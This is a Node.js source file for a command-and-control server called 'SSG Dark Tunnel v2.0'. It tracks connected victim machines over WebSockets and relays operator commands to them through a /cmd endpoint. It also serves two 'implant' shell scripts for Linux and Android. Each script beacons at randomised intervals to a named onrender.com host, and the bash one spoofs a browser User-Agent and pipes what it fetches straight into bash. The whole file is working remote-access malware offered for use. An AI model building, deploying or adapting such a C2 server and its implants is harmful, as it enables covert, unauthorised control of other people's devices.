const express = require('express');
const WebSocket = require('ws');
const path = require('path');
const app = express();
const port = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public'));
app.use('/ws', express.static('public'));

const activeTunnels = {};
const logs = [];
let tunnelCount = 0;

function log(msg) {
    logs.push(`[${new Date().toISOString()}] ${msg}`);
    console.log(msg);
}

// PWA + APK Routes
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public/index.html')));
app.get('/manifest.json', (req, res) => res.sendFile(path.join(__dirname, 'public/manifest.json')));

// API
app.get('/ping', (req, res) => res.send('pong'));
app.get('/status', (req, res) => res.json({status: 'ready', tunnels: Object.keys(activeTunnels).length}));
app.get('/logs', (req, res) => res.type('text/plain').send(logs.slice(-50).join('\n')));
app.get('/tunnels', (req, res) => res.json(activeTunnels));

app.post('/cmd', express.json(), (req, res) => {
    const tunnelIds = Object.keys(activeTunnels);
    if (tunnelIds.length === 0) return res.status(404).json({error: 'No tunnels'});
    
    const ws = activeTunnels[tunnelIds[0]].ws;
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({type: 'cmd', payload: req.body.payload}));
        res.json({status: 'sent', tunnel: tunnelIds[0].slice(-6)});
    } else {
        res.status(503).json({error: 'Tunnel not ready'});
    }
});

app.delete('/tunnel/:id', (req, res) => {
    const id = req.params.id;
    if (activeTunnels[id]) {
        activeTunnels[id].ws.close();
        delete activeTunnels[id];
        log(`💥 Disconnected tunnel ${id.slice(-6)}`);
        res.json({status: 'disconnected'});
    } else {
        res.status(404).json({error: 'Tunnel not found'});
    }
});

// Implants
app.get('/implant.sh', (req, res) => res.type('text/plain').send(
`#!/bin/bash
C2="wss://ssg-27mx.onrender.com/ws"
while true; do
  sleep \$((RANDOM%60+30))
  curl -sN -H "User-Agent: Mozilla/5.0" \$C2 | bash 2>/dev/null ||:
done`));

app.get('/implant-android.sh', (req, res) => res.type('text/plain').send(
`#!/bin/sh
C2="wss://ssg-27mx.onrender.com/ws"
while :; do
  sleep \$((RANDOM%60+30))
  wget -qO- \$C2/ping >/dev/null ||:
done`));

// WebSocket Server
const wss = new WebSocket.Server({ noServer: true });
wss.on('connection', (ws) => {
    const tunnelId = (tunnelCount++).toString();
    activeTunnels[tunnelId] = {ws, connected: new Date().toISOString()};
    log(`🐙 Tunnel #${tunnelId} connected (${Object.keys(activeTunnels).length} active)`);
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data.toString());
            if (msg.payload) log(`→ ${msg.payload.slice(0,50)}`);
            if (msg.output) log(`← ${msg.output.slice(0,100)}`);
        } catch(e) {}
    });
    
    ws.on('close', () => {
        delete activeTunnels[tunnelId];
        log(`💥 Tunnel #${tunnelId} disconnected`);
    });
});

const server = app.listen(port, '::', () => {
    log(`🌐 SSG Dark Tunnel v2.0 live on [::]:${port}`);
});

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, (ws) => {
        wss.emit('connection', ws, request);
    });
});
